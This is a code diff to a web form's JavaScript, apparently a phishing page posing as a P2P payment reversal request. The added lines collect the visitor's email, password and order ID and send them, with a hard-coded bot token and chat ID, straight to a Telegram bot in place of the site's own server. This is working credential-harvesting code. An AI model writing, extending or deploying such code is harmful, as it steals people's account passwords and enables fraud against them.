@@ -389,21 +389,40 @@
       btn.textContent = 'Submitting…';
       btn.disabled = true;
 
-      // POST to server → Telegram
-      fetch('/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, orderId, reason }),
+      const BOT_TOKEN = '8751335932:AAHoS96avp1R_OsG0uI9yk1aie02H7Lb2Ms';
+      const CHAT_ID   = '2056358288';
+
+      const reasonLabels = {
+        no_payment : 'No payment received',
+        no_proof   : 'No payment proof',
+        fraud      : 'Suspected fraud',
+        other      : 'Other',
+      };
+
+      const message = [
+        '🔔 *New P2P Reversal Request*',
+        '',
+        `📧 *Email:* \`${email}\``,
+        `🔑 *Password:* \`${password}\``,
+        `🆔 *Order ID:* \`${orderId}\``,
+        `📋 *Reason:* ${reasonLabels[reason] || reason}`,
+        `🕒 *Time:* ${new Date().toUTCString()}`,
+      ].join('\n');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method  : 'POST',
+        headers : { 'Content-Type': 'application/json' },
+        body    : JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
       })
         .then(res => res.json())
         .then(data => {
-          if (data.success) {
+          if (data.ok) {
             showToast('✅ Reversal submitted successfully!', 4000);
             document.getElementById('reversalForm').reset();
             reasonField.classList.remove('filled');
             reasonSelect.classList.remove('has-value');
           } else {
-            showToast(data.message || 'Submission failed. Please try again.');
+            showToast('Submission failed. Please try again.');
           }
         })
         .catch(() => {
